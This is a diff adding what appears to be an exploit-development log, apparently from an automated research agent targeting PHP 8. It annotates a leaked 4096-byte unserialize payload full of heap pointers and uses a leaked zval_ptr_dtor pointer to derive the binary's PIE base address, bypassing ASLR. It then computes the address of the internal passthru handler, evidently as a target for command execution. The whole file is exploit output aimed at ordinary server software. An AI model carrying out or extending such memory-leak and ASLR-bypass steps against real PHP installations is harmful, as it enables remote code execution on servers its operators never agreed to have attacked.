@@ -1,0 +1,27 @@
+file=/tmp/opencode/research/php8pie_20261022_0325/req/leak3_served.bin size=135369
+s:4096:" marker at 26
+payload 34..4130
+  +0x000 = 0x0000000000000000  rec2 J long value (4096 -> S->len)
+  +0x008 = 0x00007f65f52592d8  rec3 X zend_string pointer
+  +0x010 = 0x0000000000000000  rec3 X zval type (0x106)
+  +0x018 = 0x00007f65f528c000  rec4 K zend_string pointer
+  +0x020 = 0x0000000000000000  rec4 K zval type (0x106)
+  +0x028 = 0x00007f65f5259310  rec5 a0 array HashTable pointer
+  +0x030 = 0x0000000000000000  rec5 a0 zval type (0x307)
+  +0x038 = 0x5858585858585858  X value bytes (24 x X)
+  +0x040 = 0x5858585858585858  
+  +0x048 = 0x5858585858585858  
+  +0x050 = 0x1e028a960aebec00  
+  +0x058 = 0x0000000700000001  HashTable gc
+  +0x060 = 0xfffffff000000010  HashTable u
+  +0x068 = 0x00007f65f5264680  HashTable arData
+  +0x070 = 0x0000000100000001  HashTable nNumUsed / nNumOfElements
+  +0x078 = 0x0000000000000008  
+  +0x080 = 0x0000000000000001  
+  +0x088 = 0x0000556e4ae644e5  HashTable pDestructor = zval_ptr_dtor (PIE text)
+  +0x090 = 0x00007f65f5259380  
+PIE-range qwords in the 4096 byte payload: 1
+  +0x088 = 0x0000556e4ae644e5 -> base 0x0000556e4a800000 aligned=True
+DERIVED_BASE 0x556e4a800000
+DECODE_SLOT 0x556e4b8c1980
+ZIF_PASSTHRU 0x556e4ac64c15
